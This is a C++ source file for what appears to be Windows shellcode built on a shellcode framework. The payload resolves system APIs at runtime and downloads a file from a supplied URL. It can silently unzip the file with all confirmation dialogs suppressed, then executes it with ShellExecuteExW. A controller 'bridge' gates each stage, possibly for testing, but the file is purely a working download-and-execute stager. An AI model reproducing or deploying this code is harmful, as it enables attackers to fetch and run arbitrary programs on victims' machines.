#pragma clang diagnostic ignored "-Wwritable-strings"

#define SCFW_ENABLE_LOAD_MODULE
#define SCFW_ENABLE_UNLOAD_MODULE
#define SCFW_ENABLE_LOOKUP_SYMBOL
#define SCFW_ENABLE_FULL_MODULE_SEARCH
#define SCFW_MODULE_DEFAULT_FLAGS  (SCFW_FLAG_DYNAMIC_LOAD | SCFW_FLAG_DYNAMIC_RESOLVE)

#include <scfw/runtime.h>
#include <scfw/platform/windows/usermode.h>

#include "bridge.h"

#include <windows.h>
#include <shellapi.h>
#include <shldisp.h>
#include <shlobj.h>
#include <urlmon.h>

IMPORT_BEGIN();
    IMPORT_MODULE("kernel32.dll");
        IMPORT_SYMBOL(Sleep);
        IMPORT_SYMBOL(ExpandEnvironmentStringsW);

    IMPORT_MODULE("ole32.dll");
        IMPORT_SYMBOL(CoInitializeEx);
        IMPORT_SYMBOL(CoUninitialize);
        IMPORT_SYMBOL(CoCreateInstance);

    IMPORT_MODULE("oleaut32.dll");
        IMPORT_SYMBOL(VariantInit);
        IMPORT_SYMBOL(VariantClear);
        IMPORT_SYMBOL(SysAllocString);
        IMPORT_SYMBOL(SysFreeString);

    IMPORT_MODULE("shell32.dll");
        IMPORT_SYMBOL(ShellExecuteExW);
        IMPORT_SYMBOL(SHCreateDirectoryExW);

    IMPORT_MODULE("urlmon.dll");
        IMPORT_SYMBOL(URLDownloadToFileW);
IMPORT_END();

namespace sc {

//////////////////////////////////////////////////////////////////////////
// Definitions.
//////////////////////////////////////////////////////////////////////////

// {13709620-C279-11CE-A49E-444553540000}
DEFINE_GUID(CLSID_Shell, 0x13709620, 0xC279, 0x11CE, 0xA4, 0x9E, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00);

// {D8F015C0-C278-11CE-A49E-444553540000}
DEFINE_GUID(IID_IShellDispatch, 0xD8F015C0, 0xC278, 0x11CE, 0xA4, 0x9E, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00);

//////////////////////////////////////////////////////////////////////////
// Variant and ComPtr helpers.
//////////////////////////////////////////////////////////////////////////

class Variant : public VARIANT {
public:
    Variant() { VariantInit(this); }
    ~Variant() { VariantClear(this); }

    Variant(const Variant&) = delete;
    Variant& operator=(const Variant&) = delete;

    Variant(LPCWSTR s) : Variant{} {
        vt = VT_BSTR;
        bstrVal = SysAllocString(s);
    }

    Variant(LONG l) : Variant{} {
        vt = VT_I4;
        lVal = l;
    }

    Variant(IDispatch* p) : Variant{} {
        vt = VT_DISPATCH;
        pdispVal = p;
        if (p) p->AddRef();
    }
};

template <typename T>
class ComPtr {
    T* p_ = nullptr;

public:
    ComPtr() = default;
    ~ComPtr() { release(); }

    ComPtr(const ComPtr&) = delete;
    ComPtr& operator=(const ComPtr&) = delete;

    void release() {
        if (p_) {
            p_->Release();
            p_ = nullptr;
        }
    }

    T* get() const { return p_; }

    T** put() {
        release();
        return &p_;
    }

    T* operator->() const { return p_; }
    operator T*() const { return p_; }
    explicit operator bool() const { return p_ != nullptr; }
};

//////////////////////////////////////////////////////////////////////////
// Bridge.
//////////////////////////////////////////////////////////////////////////

struct bridge
    : common_bridge<BRIDGE_REQUEST_DOWNLOAD>
{
    static constexpr uint32_t RESPONSE_CONTINUE = 0x00000000;
    static constexpr uint32_t RESPONSE_WAIT     = 0x00000001;
    static constexpr uint32_t RESPONSE_ABORT    = 0xFFFFFFFF;

    static constexpr uint16_t METHOD_DOWNLOAD = 0x0001;
    static constexpr uint16_t METHOD_EXTRACT  = 0x0002;
    static constexpr uint16_t METHOD_EXECUTE  = 0x0003;

    static constexpr uint16_t ERROR_INVOCATION_FAILED_MASK = 0x0100;
    static constexpr uint16_t ERROR_INVALID_PARAMETER_MASK = 0x0200;

    //
    // General errors.
    //

    static constexpr uint16_t ERROR_ABORT = 0xFFFF;

    //
    // Invocation errors.
    //

    static constexpr uint16_t ERROR_INVOCATION_FAILED_COINITIALIZEEX            = ERROR_INVOCATION_FAILED_MASK | 0x01;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_COCREATEINSTANCE          = ERROR_INVOCATION_FAILED_MASK | 0x02;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_URLDOWNLOADTOFILEW        = ERROR_INVOCATION_FAILED_MASK | 0x03;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_EXPANDENVIRONMENTSTRINGSW = ERROR_INVOCATION_FAILED_MASK | 0x04;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_SHCREATEDIRECTORYEXW      = ERROR_INVOCATION_FAILED_MASK | 0x05;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_SHELLEXECUTEEXW           = ERROR_INVOCATION_FAILED_MASK | 0x06;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_ISHELLDISPATCH_NAMESPACE_ARCHIVE = ERROR_INVOCATION_FAILED_MASK | 0x11;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_ISHELLDISPATCH_NAMESPACE_OUTPUT  = ERROR_INVOCATION_FAILED_MASK | 0x12;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_FOLDER_ITEMS              = ERROR_INVOCATION_FAILED_MASK | 0x13;
    static constexpr uint16_t ERROR_INVOCATION_FAILED_FOLDER_COPYHERE           = ERROR_INVOCATION_FAILED_MASK | 0x14;

    //
    // Invalid-parameter errors.
    //

    static constexpr uint16_t ERROR_INVALID_PARAMETER_FLAGS                     = ERROR_INVALID_PARAMETER_MASK | 0x01;
    static constexpr uint16_t ERROR_INVALID_PARAMETER_URL                       = ERROR_INVALID_PARAMETER_MASK | 0x02;
    static constexpr uint16_t ERROR_INVALID_PARAMETER_DOWNLOAD_PATH             = ERROR_INVALID_PARAMETER_MASK | 0x03;
    static constexpr uint16_t ERROR_INVALID_PARAMETER_EXTRACTION_DIRECTORY      = ERROR_INVALID_PARAMETER_MASK | 0x04;
    static constexpr uint16_t ERROR_INVALID_PARAMETER_EXECUTABLE_PATH           = ERROR_INVALID_PARAMETER_MASK | 0x05;
    static constexpr uint16_t ERROR_INVALID_PARAMETER_WORKING_DIRECTORY         = ERROR_INVALID_PARAMETER_MASK | 0x06;

    //
    // Parameter tags for errors.
    //

    static constexpr uint16_t ERROR_TAG_DOWNLOAD_PATH           = 0x0001;
    static constexpr uint16_t ERROR_TAG_EXTRACTION_DIRECTORY    = 0x0002;
    static constexpr uint16_t ERROR_TAG_EXECUTABLE_PATH         = 0x0003;
    static constexpr uint16_t ERROR_TAG_WORKING_DIRECTORY       = 0x0004;

    static uint32_t download(_In_opt_ uint32_t attempt = 0) { return request_and_wait(METHOD_DOWNLOAD, attempt); }
    static uint32_t extract(void) { return request_and_wait(METHOD_EXTRACT); }
    static uint32_t execute(void) { return request_and_wait(METHOD_EXECUTE); }

private:
    static uint32_t request_and_wait(
        _In_ uint16_t method,
        _In_ uintptr_t argument1 = 0
    ) {
        for (;;) {
            switch (request(method, argument1).value_or(RESPONSE_WAIT)) {
            case RESPONSE_WAIT:
                Sleep(100);
                break;
            case RESPONSE_CONTINUE:
                return RESPONSE_CONTINUE;
            case RESPONSE_ABORT:
            default:
                return RESPONSE_ABORT;
            }
        }
    }
};

//////////////////////////////////////////////////////////////////////////
// Flag bits.
//////////////////////////////////////////////////////////////////////////

static constexpr ULONG FLAG_EXTRACT             = 1u << 0;
static constexpr ULONG FLAG_EXECUTE             = 1u << 1;
static constexpr ULONG FLAG_ARGUMENTS           = 1u << 8;
static constexpr ULONG FLAG_WORKING_DIRECTORY   = 1u << 9;
static constexpr ULONG FLAG_SHOW_WINDOW         = 1u << 10;

static constexpr ULONG FLAG_MASK =
      FLAG_EXTRACT
    | FLAG_EXECUTE
    | FLAG_ARGUMENTS
    | FLAG_WORKING_DIRECTORY
    | FLAG_SHOW_WINDOW;

//////////////////////////////////////////////////////////////////////////
// Download loop.
//////////////////////////////////////////////////////////////////////////

uint16_t
Download(
    LPCWSTR wszUrl,
    LPCWSTR wszPath
    )
{
    ULONG attempt = 0;

    for (;;) {
        attempt++;

        HRESULT hr = URLDownloadToFileW(NULL, wszUrl, wszPath, 0, NULL);
        if (SUCCEEDED(hr)) {
            return 0;
        }

        if (bridge::download(attempt) != bridge::RESPONSE_CONTINUE) {
            return bridge::ERROR_INVOCATION_FAILED_URLDOWNLOADTOFILEW;
        }

        Sleep(400);
    }
}

//////////////////////////////////////////////////////////////////////////
// Extract.
//////////////////////////////////////////////////////////////////////////

uint16_t
Extract(
    LPCWSTR wszArchive,
    LPCWSTR wszOutDir
    )
{
    //
    // Create Shell.Application object.
    //

    ComPtr<IShellDispatch> shell;
    {
        HRESULT hr = CoCreateInstance(*_(&CLSID_Shell), NULL, CLSCTX_INPROC_SERVER,
                                      *_(&IID_IShellDispatch), (void**)shell.put());
        if (FAILED(hr)) return bridge::ERROR_INVOCATION_FAILED_COCREATEINSTANCE;
    }

    //
    // Get Folder object for the ZIP file: shell.NameSpace(wszZipFull).
    //

    ComPtr<Folder> archiveFolder;
    {
        HRESULT hr = shell->NameSpace(Variant{ wszArchive }, archiveFolder.put());
        if (FAILED(hr) || !archiveFolder)
            return bridge::ERROR_INVOCATION_FAILED_ISHELLDISPATCH_NAMESPACE_ARCHIVE;
    }

    //
    // Get Folder object for the output directory: shell.NameSpace(wszOutFull).
    //

    ComPtr<Folder> outFolder;
    {
        HRESULT hr = shell->NameSpace(Variant{ wszOutDir }, outFolder.put());
        if (FAILED(hr) || !outFolder)
            return bridge::ERROR_INVOCATION_FAILED_ISHELLDISPATCH_NAMESPACE_OUTPUT;
    }

    //
    // Get the Items collection from the zip folder: zipFolder.Items().
    //

    ComPtr<FolderItems> items;
    {
        HRESULT hr = archiveFolder->Items(items.put());
        if (FAILED(hr) || !items)
            return bridge::ERROR_INVOCATION_FAILED_FOLDER_ITEMS;
    }

    //
    // Copy items to output: outFolder.CopyHere(items, flags).
    //
    // Flags:
    //   0x04 = do not display a progress dialog
    //   0x10 = respond "Yes to All" for any dialog
    //   0x14 = combined
    //

    {
        HRESULT hr = outFolder->CopyHere(Variant{ &*items }, Variant{ 0x14L });
        if (FAILED(hr)) return bridge::ERROR_INVOCATION_FAILED_FOLDER_COPYHERE;

        //
        // CopyHere is asynchronous. We need to wait for it to finish.
        // A simple approach: poll until the item count in the output matches
        // the zip, or just sleep. We'll use a polling approach.
        //

        LONG lArchiveCount = 0;
        items->get_Count(&lArchiveCount);

        // Poll output folder until it has all items (with timeout).
        for (int i = 0; i < 600; i++) {  // up to 60 seconds
            Sleep(100);

            ComPtr<FolderItems> outItems;
            outFolder->Items(outItems.put());

            if (outItems) {
                LONG lOutCount = 0;
                outItems->get_Count(&lOutCount);
                if (lOutCount >= lArchiveCount) break;
            }
        }
    }

    return 0;
}

//////////////////////////////////////////////////////////////////////////
// Path helpers.
//////////////////////////////////////////////////////////////////////////

static
uint16_t
ExpandPath(
    LPCWSTR wszInput,
    LPWSTR  wszOutput,
    DWORD   cchOutput
    )
{
    DWORD result = ExpandEnvironmentStringsW(wszInput, wszOutput, cchOutput);

    if (result == 0 || result > cchOutput) {
        return bridge::ERROR_INVOCATION_FAILED_EXPANDENVIRONMENTSTRINGSW;
    }

    return 0;
}

// Ensures `wszPath` (and every missing ancestor) exists as a directory.
// Returns 0 on success or if the directory already exists,
// bridge::ERROR_INVOCATION_FAILED_SHCREATEDIRECTORYEXW otherwise.
static
uint16_t
EnsureDirectory(
    LPCWSTR wszPath
    )
{
    int status = SHCreateDirectoryExW(NULL, wszPath, NULL);

    if (status == ERROR_SUCCESS || status == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    return bridge::ERROR_INVOCATION_FAILED_SHCREATEDIRECTORYEXW;
}

//////////////////////////////////////////////////////////////////////////
// Validation helpers.
//////////////////////////////////////////////////////////////////////////

static
BOOLEAN
ValidateFlags(
    ULONG Flags
    )
{
    if ((Flags & ~FLAG_MASK) != 0) return FALSE;

    //
    // Per-knob flags only meaningful with FLAG_EXECUTE.
    //

    const ULONG Knobs =
          FLAG_ARGUMENTS
        | FLAG_WORKING_DIRECTORY
        | FLAG_SHOW_WINDOW;

    if ((Flags & Knobs) != 0 && (Flags & FLAG_EXECUTE) == 0) return FALSE;

    return TRUE;
}

//
// Compute dirname in place.
//
// Find the last backslash in `Buffer` and truncate there.
// Buffer is modified directly.
//

static
VOID
DirnameInPlace(
    LPWSTR Buffer
    )
{
    LONG Length = (LONG)wcslen(Buffer);
    for (LONG i = Length - 1; i >= 0; i--) {
        if (Buffer[i] == L'\\') {
            Buffer[i] = L'\0';
            return;
        }
    }
    //
    // No backslash found - leave buffer as-is, Windows will treat it as a
    // relative path.
    //
}

//////////////////////////////////////////////////////////////////////////
// Entry.
//////////////////////////////////////////////////////////////////////////

extern "C"
void
__fastcall
entry(
    void* argument1,
    void* argument2
    )
{
    (void)argument2;

    uint16_t err;
    void* cursor = argument1;

    //
    // Read and validate flags.
    //

    ULONG Flags = ScNextParameterULONG(&cursor);

    if (!ValidateFlags(Flags)) {
        bridge::exit(bridge::ERROR_INVALID_PARAMETER_FLAGS);
        return;
    }

    //
    // Download gate.
    //

    if (bridge::download() != bridge::RESPONSE_CONTINUE) {
        bridge::exit(bridge::ERROR_ABORT);
        return;
    }

    //
    // Read URL.
    //

    LPWSTR wszUrl = ScNextParameterW(&cursor);
    if (!wszUrl) {
        bridge::exit(bridge::ERROR_INVALID_PARAMETER_URL);
        return;
    }

    //
    // Read DownloadPath.
    //

    LPWSTR wszRawDownloadPath = ScNextParameterW(&cursor);
    if (!wszRawDownloadPath) {
        bridge::exit(bridge::ERROR_INVALID_PARAMETER_DOWNLOAD_PATH);
        return;
    }

    //
    // Expand DownloadPath and ensure its parent directory exists.
    //

    WCHAR wszDownloadPath[MAX_PATH];
    err = ExpandPath(wszRawDownloadPath, wszDownloadPath, MAX_PATH);
    if (err) {
        bridge::exit(err, bridge::ERROR_TAG_DOWNLOAD_PATH);
        return;
    }

    WCHAR wszDownloadDirectory[MAX_PATH];
    wcscpy(wszDownloadDirectory, wszDownloadPath);
    DirnameInPlace(wszDownloadDirectory);

    err = EnsureDirectory(wszDownloadDirectory);
    if (err) {
        bridge::exit(err, bridge::ERROR_TAG_DOWNLOAD_PATH);
        return;
    }

    //
    // Download loop.
    //

    err = Download(wszUrl, wszDownloadPath);
    if (err) {
        bridge::exit(err);
        return;
    }

    //
    // Extract stage.
    //

    if (Flags & FLAG_EXTRACT) {
        if (bridge::extract() != bridge::RESPONSE_CONTINUE) {
            bridge::exit(bridge::ERROR_ABORT);
            return;
        }

        LPWSTR wszRawExtractDir = ScNextParameterW(&cursor);
        if (!wszRawExtractDir) {
            bridge::exit(bridge::ERROR_INVALID_PARAMETER_EXTRACTION_DIRECTORY);
            return;
        }

        //
        // Expand ExtractionDirectory and ensure it exists.
        //

        WCHAR wszExtractDir[MAX_PATH];
        err = ExpandPath(wszRawExtractDir, wszExtractDir, MAX_PATH);
        if (err) {
            bridge::exit(err, bridge::ERROR_TAG_EXTRACTION_DIRECTORY);
            return;
        }

        err = EnsureDirectory(wszExtractDir);
        if (err) {
            bridge::exit(err, bridge::ERROR_TAG_EXTRACTION_DIRECTORY);
            return;
        }

        HRESULT hr = CoInitializeEx(NULL, 0);
        if (FAILED(hr)) {
            bridge::exit(bridge::ERROR_INVOCATION_FAILED_COINITIALIZEEX);
            return;
        }

        err = Extract(wszDownloadPath, wszExtractDir);

        CoUninitialize();

        if (err) {
            bridge::exit(err);
            return;
        }
    }

    //
    // Execute stage.
    //

    if (Flags & FLAG_EXECUTE) {
        if (bridge::execute() != bridge::RESPONSE_CONTINUE) {
            bridge::exit(bridge::ERROR_ABORT);
            return;
        }

        LPWSTR wszRawExecutablePath = ScNextParameterW(&cursor);
        if (!wszRawExecutablePath) {
            bridge::exit(bridge::ERROR_INVALID_PARAMETER_EXECUTABLE_PATH);
            return;
        }

        //
        // Expand ExecutablePath.
        //

        WCHAR wszExecutablePath[MAX_PATH];
        err = ExpandPath(wszRawExecutablePath, wszExecutablePath, MAX_PATH);
        if (err) {
            bridge::exit(err, bridge::ERROR_TAG_EXECUTABLE_PATH);
            return;
        }

        LPWSTR wszArguments = NULL;
        if (Flags & FLAG_ARGUMENTS) {
            wszArguments = ScNextParameterW(&cursor);
        }

        WCHAR workingDirectoryBuffer[MAX_PATH];
        LPWSTR wszWorkingDirectory = NULL;
        if (Flags & FLAG_WORKING_DIRECTORY) {
            LPWSTR wszRawWorkingDirectory = ScNextParameterW(&cursor);
            if (!wszRawWorkingDirectory) {
                bridge::exit(bridge::ERROR_INVALID_PARAMETER_WORKING_DIRECTORY);
                return;
            }

            err = ExpandPath(wszRawWorkingDirectory, workingDirectoryBuffer, MAX_PATH);
            if (err) {
                bridge::exit(err, bridge::ERROR_TAG_WORKING_DIRECTORY);
                return;
            }

            wszWorkingDirectory = workingDirectoryBuffer;
        }
        else {
            //
            // Default: dirname(expanded ExecutablePath).
            //

            wcscpy(workingDirectoryBuffer, wszExecutablePath);
            DirnameInPlace(workingDirectoryBuffer);

            wszWorkingDirectory = workingDirectoryBuffer;
        }

        int nShow = SW_SHOWNORMAL;
        if (Flags & FLAG_SHOW_WINDOW) {
            nShow = (int)ScNextParameterULONG(&cursor);
        }

        SHELLEXECUTEINFOW sei = {
            .cbSize       = sizeof(SHELLEXECUTEINFOW),
            .lpFile       = wszExecutablePath,
            .lpParameters = wszArguments,
            .lpDirectory  = wszWorkingDirectory,
            .nShow        = nShow,
        };

        if (!ShellExecuteExW(&sei)) {
            bridge::exit(bridge::ERROR_INVOCATION_FAILED_SHELLEXECUTEEXW);
            return;
        }
    }

    bridge::exit(0);
}

} // namespace sc
